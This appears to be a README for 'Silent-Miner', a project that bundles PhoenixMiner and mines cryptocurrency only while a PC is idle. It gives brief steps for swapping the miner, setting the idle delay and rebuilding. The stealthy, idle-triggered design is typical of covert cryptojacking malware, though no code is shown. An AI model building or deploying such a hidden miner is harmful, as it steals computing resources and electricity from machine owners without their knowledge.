# Silent-Miner
Custom Silent Miner
Idle time (start to mine when the pc is idle and stop to mine when the pc back to work)

Easy to use

you can change and use any miner you to miner too

1. change the phonixminer in the rescource in the visual project (i put there phonixminer)
2. change the idle time in line 68 as you can see i did it for 60 sec ( Thread.Sleep(60 * 1000); )
3. Rebuild the project and make sure you build it on x64

sorry on my english :)
